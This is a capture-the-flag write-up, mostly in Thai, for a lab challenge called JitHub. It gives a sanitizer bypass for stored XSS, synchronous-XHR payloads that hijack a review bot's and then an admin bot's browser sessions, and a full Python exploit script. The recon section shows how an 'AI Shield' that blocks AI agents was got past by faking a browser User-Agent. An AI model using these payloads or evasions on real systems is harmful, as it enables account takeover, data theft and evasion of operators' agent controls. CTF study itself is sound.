# JitHub Writeup — Aegis CTF

**Target:** https://inst-30313.aegis-ctf.com/  
**Goal:** อ่าน confidential release attestation (format `aegis{...}`) ที่ไม่ควรเข้าถึงได้จาก org owner ปกติ  
**Flag:** `aegis{qtxiqPfgxupniUijTQcrCXb5Mx85ZqdC}`

---

## 1) Challenge overview

JitHub เป็นแพลตฟอร์มจัดการ repo / build / deploy / release review  
เริ่มต้นในฐานะ **organization owner** ที่เพิ่งสมัคร

เป้าหมายคือพิสูจน์ว่า owner ธรรมดาสามารถเข้าถึง **confidential release attestation** ของระบบได้ (จริงๆ ถูกผูกกับ clearance ของ admin)

---

## 2) Recon

### 2.1 หน้าเว็บเป็น SPA

```html
<main id="app"></main>
<script src="/app.js" defer></script>
```

Logic หลักอยู่ที่ `/app.js`

มี prompt-injection ซ่อนใน HTML (AI shield) — ข้ามได้

### 2.2 AI Agent blocking

request จาก `python-requests` UA ปกติโดน:

```text
Aegis AI Shield: Access denied for AI Agents
```

แก้ด้วย browser UA:

```python
headers = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ... Chrome/128.0.0.0 Safari/537.36",
  "Origin": "https://inst-30313.aegis-ctf.com",
  "Referer": "https://inst-30313.aegis-ctf.com/",
}
```

### 2.3 สมัครบัญชี

```http
POST /api/auth/register
{"orgName":"...","email":"...","password":"Password123!","fullName":"Owner"}
```

ได้ session cookie `jh_session`

### 2.4 อ่าน docs ใน UI

ในแท็บ Docs มี hint สำคัญ:

- Compliance records: `/api/compliance/records/<recordId>`
- Internal services ใส่ **role scope** หลัง `/api`
- Case actions: `/api/<role>/cases/<caseId>/<action>`
- Callback รับ POST ได้เฉพาะ **Runner Review service session**
- Reviewer เห็น metadata ของ restricted record แต่ content ต้องมี clearance
- Platform Admin เปิด evidence bundle ใน internal viewer

### 2.5 Service map จาก `/api/bootstrap`

บริการที่เกี่ยวข้องโดยตรง:

- `release-guard-service`
- `review-bot-worker` → เปิด diagnostic ใน authenticated browser
- `compliance-service` → เก็บ restricted release records
- `admin-bot-worker` → ประมวลผลเคสที่ escalate
- `internal-mail-service` → reply เข้า reviewer inbox

---

## 3) Mapping attack surface

ฟีเจอร์หลักที่เกี่ยว:

| Feature | Endpoint | หมายเหตุ |
|---|---|---|
| Release Guard report | `POST /api/release-guard/reports` | ใส่ Rich Summary (Markdown/HTML) |
| Preview renderer | `POST /api/release-guard/preview` | sanitizer ของ HTML |
| Submit for review | `POST /api/release-guard/reports/<id>/submit` | คิวให้ review bot |
| Callback | `POST /api/callbacks/<token>` | รับได้แค่ review_bot |
| Reviewer bootstrap | `GET /api/reviewer/bootstrap` | เห็น case + record metadata |
| Escalate | `POST /api/reviewer/cases/<id>/escalate` | ส่ง evidence bundle |
| Admin reply | `POST /api/admin/cases/<id>/reply` | เข้า inbox ของ reviewer |
| Compliance record | `GET /api/compliance/records/<id>` | ต้อง admin clearance |

พบเพิ่ม: `/api/audit` รั่ว `caseId` ตอน submit report

---

## 4) HTML sanitizer bypass (XSS)

ทดสอบผ่าน `/api/release-guard/preview`

ส่วนใหญ่ถูกตัด เช่น `onerror`, `<script>`, `javascript:`

แต่ **HTML entity ในชื่อ attribute** ผ่าน:

```html
<img src=x onerror&#61;alert(1)>
```

preview แปลงเป็น:

```html
<img src=x onerror=alert(1)>
```

ต้องใส่ quotes ถ้า payload ยาว ไม่งั้นโดน escape เป็น text

```html
<img src=x onerror&#61;"/* js ที่นี่ */">
```

Preview iframe มี `sandbox="allow-scripts allow-modals"` (ไม่มี `allow-same-origin`) แต่ **review bot** เปิดใน authenticated browser จริง → XSS ใช้ session ของ bot ได้

---

## 5) Exploit #1 — XSS → review_bot session → exfil ผ่าน callback

### 5.1 สร้าง callback

```http
POST /api/release-guard/callbacks
{"label":"exfil"}
```

ได้ `token`

### 5.2 Sync XHR สำคัญ

`fetch()` แบบ async มักไม่ทัน เพราะ bot ปิดหน้าเร็ว  
ใช้ **synchronous XHR** แทน

### 5.3 Payload ตัวอย่าง (อ่าน bootstrap แล้วโพสต์เข้า callback)

```html
<img src=x onerror&#61;"var x=new XMLHttpRequest();x.open('GET','/api/reviewer/bootstrap',false);x.send();var y=new XMLHttpRequest();y.open('POST','/api/callbacks/TOKEN',false);y.setRequestHeader('Content-Type','application/json');y.send(JSON.stringify({data:x.responseText}));">
```

### 5.4 Submit

```http
POST /api/release-guard/reports
{"projectId":"prj_...","title":"xss","summary":"<img ...>"}

POST /api/release-guard/reports/<id>/submit
```

### 5.5 ผลลัพธ์

Callback ได้ JSON จาก `review_bot`:

- session role = `review_bot`
- cases[] พร้อม `record.id` เช่น `rec_...`
- classification = `Platform administrator only`

ลองอ่านตรงๆ ด้วย owner / review_bot:

```http
GET /api/compliance/records/rec_...
→ 403 {"error":"admin_clearance_required"}
```

เลยต้องขึ้นไปที่ admin bot

---

## 6) Exploit #2 — escalate + XSS ใน evidence bundle → release_admin

### 6.1 Evidence example format

จาก:

```http
GET /api/reviewer/cases/<caseId>/evidence-example
```

โครงประมาณนี้:

```json
{
  "profile": "evp_...",
  "version": 1,
  "producer": {
    "adapter": "terminal-compat-760",
    "runnerId": "...",
    "buildId": "..."
  },
  "blocks": [
    {"type": "review-note....", "content": "..."},
    {
      "type": "runner-terminal....",
      "encoding": "base64url",
      "content": "<base64url of HTML>"
    }
  ]
}
```

HTML ใน terminal block หน้าตาแบบ:

```html
<section class="terminal-compat-760" data-case="case_...">
  <pre data-build="bld_...">...</pre>
</section>
```

### 6.2 จุดสำคัญเรื่อง exfil ของ admin

Callback รับได้แค่ **Runner Review session**  
`release_admin` โพสต์ callback ไม่ได้

ใช้ช่องทางอื่น:

```http
POST /api/admin/cases/<caseId>/reply
{"message":"<exfil data>"}
```

ข้อความไปค้างใน `/api/reviewer/inbox`

### 6.3 XSS ใน evidence (ต้องใช้ `onerror=` ตรงๆ ใน HTML ที่ decode แล้ว)

ตอนใส่ใน summary ต้องใช้ `onerror&#61;` เพราะผ่าน markdown sanitizer  
แต่ใน evidence HTML ที่ admin viewer render ตรงๆ ต้องใช้:

```html
<img src=x onerror="...">
```

ถ้าเหลือ `onerror&#61;` บางที browser/parser ไม่ยิง handler

### 6.4 Admin payload (ย่อ)

```javascript
var O={};
function G(p){var x=new XMLHttpRequest();x.open('GET',p,false);x.send();return x.status+x.responseText;}
function P(u,b){var x=new XMLHttpRequest();x.open('POST',u,false);x.setRequestHeader('Content-Type','application/json');x.send(b);}
O.s=G('/api/session');
O.a=G('/api/admin/console');
O.r=G('/api/compliance/records/RECORD_ID');
O.ra=G('/api/admin/compliance/records/RECORD_ID');
P('/api/admin/cases/CASE_ID/reply', JSON.stringify({message: JSON.stringify(O).slice(0,8000)}));
```

ฝังใน:

```html
<section class="terminal-compat-760" data-case="CASE_ID">
  <pre>x</pre>
  <img src=x onerror="ADMIN_JS_HERE">
</section>
```

แล้ว base64url ใส่ใน `runner-terminal` block

### 6.5 สั่ง escalate ด้วย review_bot XSS

flow:

1. สร้าง report ธรรมดา → ได้ `caseId` จาก `/api/audit`
2. XSS อ่าน bootstrap → ได้ `recordId` ของเคสนั้น
3. XSS ของ review_bot เรียก:

```http
POST /api/reviewer/cases/<caseId>/escalate
{"evidenceBundle":{...malicious...}}
```

ได้ `status: admin_queued` → ต่อด้วย `admin_reviewing` / `admin_reviewed`

---

## 7) Exploit #3 — อ่าน inbox ด้วย review_bot → ได้ flag

หลัง admin bot รัน XSS แล้ว reply กลับมา

ยิง XSS อีกรอบ:

```javascript
function G(p){var x=new XMLHttpRequest();x.open('GET',p,false);x.send();return x.responseText;}
function P(u,b){var x=new XMLHttpRequest();x.open('POST',u,false);x.setRequestHeader('Content-Type','application/json');x.send(b);}
P('/api/callbacks/TOKEN', JSON.stringify({
  data: JSON.stringify({
    inbox: G('/api/reviewer/inbox'),
    boot: G('/api/reviewer/bootstrap')
  }).slice(0,15000)
}));
```

ใน inbox พบ message จาก:

- email: `release-admin-...@jithub.local`
- role: `release_admin`

และ content ของ compliance record:

```text
JitHub confidential release assurance
...
Attestation result: aegis{qtxiqPfgxupniUijTQcrCXb5Mx85ZqdC}
```

---

## 8) End-to-end chain (สรุปสั้น)

```text
Org Owner
  │
  ├─ HTML sanitizer bypass: onerror&#61;
  │
  ├─ Release Guard report XSS
  │     └─ review-bot-worker (authenticated browser)
  │           ├─ GET /api/reviewer/bootstrap  → recordId
  │           ├─ POST /api/callbacks/<token>  → exfil
  │           └─ POST /api/reviewer/cases/<id>/escalate (evil evidence)
  │
  ├─ admin-bot-worker เปิด evidence viewer
  │     ├─ XSS (onerror=)
  │     ├─ GET /api/compliance/records/<id>          → 200 + flag
  │     └─ POST /api/admin/cases/<id>/reply          → ส่งเข้า inbox
  │
  └─ review_bot XSS อ่าน /api/reviewer/inbox → FLAG
```

---

## 9) Full exploit script (รวมขั้นตอน)

ใช้กับ venv ตามที่เตรียมไว้:

```bash
source /home/kali/Lab/JitHub_9-8-2026/venv/bin/activate
```

```python
#!/usr/bin/env python3
import requests, json, time, base64, random, string

BASE = "https://inst-30313.aegis-ctf.com"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

def sess():
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "application/json",
        "Origin": BASE,
        "Referer": BASE + "/",
    })
    return s

def b64url(s: str) -> str:
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

def img_xss(js: str) -> str:
    # for Release Guard markdown/html pipeline
    return '<img src=x onerror&#61;"' + js.replace('"', "&quot;") + '">'

def wait_delivery(s, token, min_count=1, timeout=30):
    t0 = time.time()
    while time.time() - t0 < timeout:
        cbs = s.get(f"{BASE}/api/release-guard/callbacks").json()
        mine = next(c for c in cbs if c["token"] == token)
        if len(mine["deliveries"]) >= min_count:
            return mine["deliveries"]
        time.sleep(1.5)
    raise TimeoutError("no callback delivery")

def bot_exec(s, prj, token, js, title="bot"):
    summary = img_xss(js)
    r = s.post(f"{BASE}/api/release-guard/reports", json={
        "projectId": prj, "title": title, "summary": summary
    })
    rid = r.json()["id"]
    s.post(f"{BASE}/api/release-guard/reports/{rid}/submit", json={})
    return wait_delivery(s, token, 1)[-1]["data"]

def main():
    s = sess()
    suf = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    email = f"owner{suf}@test.local"
    password = "Password123!"

    # 1) register
    s.post(f"{BASE}/api/auth/register", json={
        "orgName": f"org{suf}",
        "email": email,
        "password": password,
        "fullName": "Owner",
    }).raise_for_status()
    print("[+] registered", email)

    prj = s.get(f"{BASE}/api/bootstrap").json()["projects"][0]["id"]
    token = s.post(f"{BASE}/api/release-guard/callbacks", json={"label": "exfil"}).json()["token"]
    print("[+] callback", token)

    # 2) create target case (benign)
    r = s.post(f"{BASE}/api/release-guard/reports", json={
        "projectId": prj, "title": "target", "summary": "# target"
    })
    rpt = r.json()["id"]
    s.post(f"{BASE}/api/release-guard/reports/{rpt}/submit", json={})
    time.sleep(5)

    case_id = None
    for a in s.get(f"{BASE}/api/audit").json():
        if a.get("target") == rpt and a.get("details", {}).get("caseId"):
            case_id = a["details"]["caseId"]
            break
    print("[+] case", case_id)

    # 3) XSS as review_bot -> get record id
    js = (
        "var x=new XMLHttpRequest();x.open('GET','/api/reviewer/bootstrap',false);x.send();"
        f"var y=new XMLHttpRequest();y.open('POST','/api/callbacks/{token}',false);"
        "y.setRequestHeader('Content-Type','application/json');"
        "y.send(JSON.stringify({data:x.responseText}));"
    )
    boot = json.loads(bot_exec(s, prj, token, js, "boot"))
    rec_id = next(c["record"]["id"] for c in boot["cases"] if c["id"] == case_id)
    print("[+] record", rec_id)

    # 4) craft evil evidence for release_admin
    admin_js = (
        "var O={};"
        "function G(p){var x=new XMLHttpRequest();x.open('GET',p,false);x.send();return x.status+x.responseText;}"
        "function P(u,b){var x=new XMLHttpRequest();x.open('POST',u,false);x.setRequestHeader('Content-Type','application/json');x.send(b);}"
        "O.s=G('/api/session');"
        f"O.r=G('/api/compliance/records/{rec_id}');"
        f"O.ra=G('/api/admin/compliance/records/{rec_id}');"
        f"P('/api/admin/cases/{case_id}/reply',JSON.stringify({{message:JSON.stringify(O).slice(0,8000)}}));"
    )
    evil_html = (
        f'<section class="terminal-compat-760" data-case="{case_id}">'
        f'<pre>x</pre><img src=x onerror="{admin_js}"></section>'
    )
    bundle = {
        "profile": "evp_78ba4538f672d312",
        "version": 1,
        "generatedAt": "2026-08-08T18:20:00.000Z",
        "producer": {
            "runnerId": "run_46982ccad9908bae44",
            "runnerVersion": "2026.07",
            "buildId": "bld_a3561b60b3fb710cc0",
            "adapter": "terminal-compat-760",
        },
        "blocks": [
            {"type": "review-note.dfb54cdc", "content": "repro"},
            {
                "type": "runner-terminal.28e1e21d",
                "encoding": "base64url",
                "content": b64url(evil_html),
            },
        ],
    }

    # 5) escalate via review_bot XSS
    token2 = s.post(f"{BASE}/api/release-guard/callbacks", json={"label": "final"}).json()["token"]
    esc_js = (
        "function P(u,b){var x=new XMLHttpRequest();x.open('POST',u,false);"
        "x.setRequestHeader('Content-Type','application/json');x.send(b);return x.status+':'+x.responseText;}"
        f"var e=P('/api/reviewer/cases/{case_id}/escalate', JSON.stringify({{evidenceBundle:{json.dumps(bundle)}}}));"
        f"P('/api/callbacks/{token2}', JSON.stringify({{data:'esc:'+e}}));"
    )
    print("[+] escalate:", bot_exec(s, prj, token2, esc_js, "escalate"))
    time.sleep(8)

    # 6) read inbox via review_bot XSS
    inbox_js = (
        "function G(p){var x=new XMLHttpRequest();x.open('GET',p,false);x.send();return x.responseText;}"
        "function P(u,b){var x=new XMLHttpRequest();x.open('POST',u,false);"
        "x.setRequestHeader('Content-Type','application/json');x.send(b);}"
        f"P('/api/callbacks/{token2}', JSON.stringify({{data:JSON.stringify({{inbox:G('/api/reviewer/inbox')}}).slice(0,15000)}}));"
    )
    data = bot_exec(s, prj, token2, inbox_js, "inbox")
    print("[+] inbox delivery:")
    print(data)

    if "aegis{" in data:
        start = data.index("aegis{")
        end = data.index("}", start) + 1
        print("\n[FLAG]", data[start:end])

if __name__ == "__main__":
    main()
```

---

## 10) Root cause / บทเรียน

1. **Stored XSS** ใน Release Guard Rich Summary เพราะ sanitizer ยอม `onerror&#61;`
2. **Privileged bot browser** (`review_bot`, `release_admin`) รัน HTML ของผู้ใช้
3. **Missing output encoding / unsafe HTML render** ใน evidence viewer ของ admin
4. **Sensitive attestation** ถูกป้องกันแค่ clearance ของ admin แต่ถูกอ่านได้หลัง hijack admin bot
5. Callback จำกัด role แต่ **admin reply → reviewer inbox** เป็นช่อง exfil สำรอง

---

## 11) Flag

```text
aegis{qtxiqPfgxupniUijTQcrCXb5Mx85ZqdC}
```
